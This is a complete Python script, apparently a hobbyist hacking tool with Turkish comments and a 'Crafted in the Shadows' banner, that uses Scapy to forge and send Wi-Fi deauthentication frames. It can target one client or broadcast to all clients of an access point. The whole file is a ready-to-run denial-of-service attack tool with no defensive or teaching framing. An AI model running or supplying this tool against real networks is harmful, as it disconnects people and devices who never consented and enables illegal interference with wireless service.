#!/usr/bin/env python3
from scapy.all import *
from optparse import OptionParser
import time
import random
import os

# Terminal renkleri
RED = "\033[91m"
GREEN = "\033[92m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
RESET = "\033[0m"

# ASCII ve Giriş
def banner():
    os.system("clear")
    print(f"""{CYAN}
         ▄████████  ▄██████▄   ▄█          ▄████████    ▄████████ 
        ███    ███ ███    ███ ███         ███    ███   ███    ███ 
        ███    █▀  ███    ███ ███         ███    █▀    ███    ███ 
        ███        ███    ███ ███        ▄███▄▄▄      ▄███▄▄▄▄██▀ 
        ███        ███    ███ ███       ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
        ███    █▄  ███    ███ ███         ███    █▄  ▀███████████ 
        ███    ███ ███    ███ ███▌    ▄   ███    ███   ███    ███ 
        ████████▀   ▀██████▀  █████▄▄██   ██████████   ███    ███ 
                               ▀                               
                    {YELLOW}Anonymous Wireless Deauth Tool{RESET}
                  {RED}⚔ Crafted in the Shadows by Miço ⚔{RESET}
    """)

# Log çıktısı gibi göstermek için
def log(msg, level="info"):
    timestamp = time.strftime("%H:%M:%S")
    if level == "info":
        print(f"{CYAN}[{timestamp}] [INFO] {msg}{RESET}")
    elif level == "warn":
        print(f"{YELLOW}[{timestamp}] [WARNING] {msg}{RESET}")
    elif level == "fail":
        print(f"{RED}[{timestamp}] [FAIL] {msg}{RESET}")
    elif level == "success":
        print(f"{GREEN}[{timestamp}] [SUCCESS] {msg}{RESET}")

# Ana saldırı fonksiyonu
def deauth_attack(iface, ap_mac, target_mac, count):
    if target_mac:
        addr1 = target_mac
        log(f"Sending deauth to target {target_mac} via AP {ap_mac}")
    else:
        addr1 = "ff:ff:ff:ff:ff:ff"
        log("No target given. Broadcasting deauth to all clients.")
    
    dot11 = Dot11(addr1=addr1, addr2=ap_mac, addr3=ap_mac)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)

    sendp(packet, iface=iface, count=count, inter=0.1, verbose=0)
    log("Deauth packets sent.", "success")

# Ana çalıştırma
def main():
    banner()

    parser = OptionParser()
    parser.add_option("-i", "--interface", dest="iface", help="Monitor mode wireless interface (e.g. wlan0mon)")
    parser.add_option("-t", "--target", dest="target", help="Target MAC address")
    parser.add_option("-a", "--ap", dest="ap", help="Access Point (Router) MAC address")
    parser.add_option("-r", "--rang", dest="rang", type="int", default=100, help="Number of packets to send (default=100)")
    
    (options, args) = parser.parse_args()

    if not options.iface or not options.ap:
        parser.error("[-] You must specify an interface and AP MAC address. Use -i and -a.")
    
    log("Interface: " + options.iface)
    log("AP MAC: " + options.ap)
    if options.target:
        log("Target MAC: " + options.target)
    else:
        log("Target MAC: Not provided — will broadcast")

    try:
        deauth_attack(options.iface, options.ap, options.target, options.rang)
    except KeyboardInterrupt:
        log("Aborted by user.", "warn")
    except Exception as e:
        log(f"Error: {e}", "fail")

if __name__ == "__main__":
    main()


